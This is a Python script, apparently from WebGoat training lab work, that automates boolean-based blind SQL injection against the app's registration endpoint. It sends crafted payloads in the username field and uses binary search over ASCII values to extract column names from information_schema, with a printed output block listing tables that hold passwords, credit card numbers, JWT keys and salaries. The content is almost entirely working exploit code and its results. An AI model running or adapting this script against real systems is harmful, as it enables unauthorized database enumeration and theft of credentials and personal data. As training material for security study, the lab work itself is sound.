import requests
import string
from tqdm import tqdm

stringset = string.printable
ip = "192.168.1.95"
url = "http://" + ip + ":8888/WebGoat/SqlInjectionAdvanced/register"
cookies = {
    "JSESSIONID": "90F95A800366352F2648DA49D28D9B0C"
}

def send_payload(payload):
    data = {
        "username_reg": payload,
        "email_reg": "a@a.com",
        "password_reg": "a",
        "confirm_password_reg": "a"
    }
    res = requests.put(url, data=data, cookies=cookies)
    # print(res.text)
    # print("--------------------------------------------------------------------")
    return "already exists" in res.text.lower()

def get_column_count(schema, table):
    for i in tqdm(range(0, 100), desc=f"[{schema}.{table}] 컬럼 개수 추측 중"):
        payload = f"' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{schema}' AND table_name='{table}') > {i} -- "
        if not send_payload(payload):
            print(f"\n[✓] {schema}.{table} 컬럼 개수: {i}")
            return i
    return 0

def get_column_name_length(schema, table, offset):
    for length in range(1, 100):
        payload = f"' OR LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='{schema}' AND table_name='{table}' LIMIT {offset},1)) > {length} -- "
        if not send_payload(payload):
            return length
    return 0

def get_column_name(schema, table, offset, length):
    name = ""
    for i in tqdm(range(1, length + 1), desc=f"[{schema}.{table}] 컬럼 #{offset} 이름 추출 중"):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' OR ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{schema}' AND table_name='{table}' LIMIT {offset},1), {i}, 1)) > {mid} -- "
            if send_payload(payload):
                low = mid + 1
            else:
                high = mid
        name += chr(low)
    return name


schema = "d3ng03"
table_list = [
    'flyway_schema_history', 'CHALLENGE_USERS', 'JWT_KEYS', 'SERVERS', 'USER_DATA', 'SALARIES', 
    'USER_DATA_TAN', 'SQL_CHALLENGE_USERS', 'USER_SYSTEM_DATA', 'EMPLOYEES', 'ACCESS_LOG', 
    'GRANT_RIGHTS', 'ACCESS_CONTROL_USERS'
]
all_columns = {}

for table in table_list:
    column_list = []
    count = get_column_count(schema, table)
    for i in range(count):
        length = get_column_name_length(schema, table, i)
        if length > 0:
            name = get_column_name(schema, table, i, length)
            column_list.append(name)
            print(f"[✓] {schema}.{table} 컬럼 #{i} 이름: {name}")
    full_name = f"{schema}.{table}"
    all_columns[full_name] = column_list

for full_table_name, columns in all_columns.items():
    print(f"\nTable: {full_table_name}")
    if not columns:
        print("  (no columns)")
    for idx, col_name in enumerate(columns):
        print(f"  [{idx}] {col_name}")

'''
Table: d3ng03.flyway_schema_history
  [0] installed_rank
  [1] version
  [2] description
  [3] type
  [4] script
  [5] checksum
  [6] installed_by
  [7] installed_on
  [8] execution_time
  [9] success

Table: d3ng03.CHALLENGE_USERS
  [0] USERID
  [1] EMAIL
  [2] PASSWORD

Table: d3ng03.JWT_KEYS
  [0] ID
  [1] KEY

Table: d3ng03.SERVERS
  [0] ID
  [1] HOSTNAME
  [2] IP
  [3] MAC
  [4] STATUS
  [5] DESCRIPTION

Table: d3ng03.USER_DATA
  [0] USERID
  [1] FIRST_NAME
  [2] LAST_NAME
  [3] CC_NUMBER
  [4] CC_TYPE
  [5] COOKIE
  [6] LOGIN_COUNT

Table: d3ng03.SALARIES
  [0] USERID
  [1] SALARY

Table: d3ng03.USER_DATA_TAN
  [0] USERID
  [1] FIRST_NAME
  [2] LAST_NAME
  [3] CC_NUMBER
  [4] CC_TYPE
  [5] COOKIE
  [6] LOGIN_COUNT
  [7] PASSWORD

Table: d3ng03.SQL_CHALLENGE_USERS
  [0] USERID
  [1] EMAIL
  [2] PASSWORD

Table: d3ng03.USER_SYSTEM_DATA
  [0] USERID
  [1] USER_NAME
  [2] PASSWORD
  [3] COOKIE

Table: d3ng03.EMPLOYEES
  [0] USERID
  [1] FIRST_NAME
  [2] LAST_NAME
  [3] DEPARTMENT
  [4] SALARY
  [5] AUTH_TAN

Table: d3ng03.ACCESS_LOG
  [0] ID
  [1] TIME
  [2] ACTION

Table: d3ng03.GRANT_RIGHTS
  [0] USERID
  [1] FIRST_NAME
  [2] LAST_NAME
  [3] DEPARTMENT
  [4] SALARY

Table: d3ng03.ACCESS_CONTROL_USERS
  [0] USERNAME
  [1] PASSWORD
  [2] ADMIN
'''